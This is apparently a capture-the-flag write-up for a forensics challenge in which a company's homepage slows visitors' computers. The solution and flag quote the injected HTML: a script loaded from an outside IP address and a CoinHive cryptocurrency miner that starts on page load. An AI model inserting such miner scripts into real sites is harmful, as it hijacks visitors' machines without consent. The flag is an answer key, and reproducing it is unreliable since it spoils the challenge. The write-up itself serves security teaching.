# 0_intrusion

## Points
100

## Description
Welcome to Drive By Inc. We provide all sorts of logistical solutions for our customers. Over the past few years we moved to hosting a large portion of our business on a nice looking website. Recently our customers are complaining that the front page of our website is causing their computers to run extremely slowly. We hope that it is just because we added too much javascript but can you take a look for us just to make sure?

What is the full malicious line? (Including any HTML tags)

[index.html](https://tamuctf.com/files/c29425401b85b195cd1225505d728fc1/index.html)

## Solution
Look at the source code of `index.html`, there is a script for mining crypto-currency.
```html
<script src = http://10.187.195.95/js/colorbox.min.js></script>
<script>var color = new CoinHive.Anonymous("123456-asdfgh");color.start()</script>
```

## Flag
`<script src = http://10.187.195.95/js/colorbox.min.js></script><script>var color = new CoinHive.Anonymous("123456-asdfgh");color.start()</script></body>`